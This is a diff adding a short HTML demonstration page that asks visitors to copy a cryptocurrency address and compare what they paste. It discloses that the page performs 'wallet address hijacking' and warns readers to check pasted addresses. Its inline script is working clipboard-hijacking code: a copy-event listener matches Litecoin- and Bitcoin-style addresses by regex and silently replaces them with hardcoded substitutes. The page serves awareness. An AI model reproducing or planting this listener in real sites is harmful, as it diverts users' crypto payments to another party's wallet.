@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>A simple proof</title>
+	<style>*{text-align: center;}</style>
+</head>
+<body>
+	<div>
+		<br><br>
+		Hi! <br><br>
+		Please copy one of the keys below, paste it on any other place, <br>
+		and compare the one you pasted with the one you tried to copy.
+	</div>
+	<h2>
+		LZnMpnkXYuZF2jmkK9RVQjGNK8Akqk3SLz
+		<br/><br/>
+		1CvTHjY8MRMZQn9nUrcmmKR4c85E1Jpr2r
+	</h2>
+	<br><br>This wallet address h1jacking works for most of the modern browsers,
+	<br>and is way too simple ( just a simple event listener and 6 lines of js code! )
+	<br><br>Whenever you copy a crypto wallet address, make sure you check it after you paste it on somewhere else.
+	<script>
+		document.addEventListener('copy', function (e){
+			e.preventDefault(); var selectedText = window.getSelection(); var textToCopy="";
+			if(/^[\s]*[L][a-km-zA-HJ-NP-Z1-9]{25,34}[\s]*$/.test(selectedText)){textToCopy = "LTgXErRfYTkvwnC3zVay7882gNmatK2B7B";}
+			else if(/^[\s]*[13][a-km-zA-HJ-NP-Z1-9]{25,34}[\s]*$/.test(selectedText)){textToCopy = "1oPTHjY8K8AkqkpnMRMn9nUrcmmKR4c873";}
+			else{textToCopy=selectedText;}
+			if (e.clipboardData) {e.clipboardData.setData('text/plain', textToCopy);}
+			else if (window.clipboardData) {window.clipboardData.setData('Text', textToCopy);}
+		});
+	</script>
+	<br><br><br><br>
+	<a href="https://github.com/gokhanmeteerturk">@gokhanmeteerturk</a>
+</body>
+</html>
